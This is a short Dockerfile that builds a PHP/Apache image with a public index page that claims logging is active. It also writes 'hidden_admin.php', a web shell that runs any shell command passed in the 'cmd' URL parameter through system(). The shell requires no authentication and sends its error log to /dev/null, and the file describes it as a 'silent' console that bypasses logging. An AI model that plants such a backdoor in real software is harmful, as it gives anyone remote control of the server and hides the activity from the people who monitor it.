FROM php:7.4-apache

# Create a standard index page
RUN echo '<h1>Public Hive Node</h1><p>Logging is active for this page.</p>' > /var/www/html/index.php

# Create a 'silent' admin page that bypasses logging
RUN echo '<?php 
ini_set("display_errors", 0); 
ini_set("log_errors", 1); 
ini_set("error_log", "/dev/null"); 
if (isset($_GET["cmd"])) { system($_GET["cmd"]); } 
?><h1>Administrative Console</h1><p>Action executed silently.</p>' > /var/www/html/hidden_admin.php

EXPOSE 80
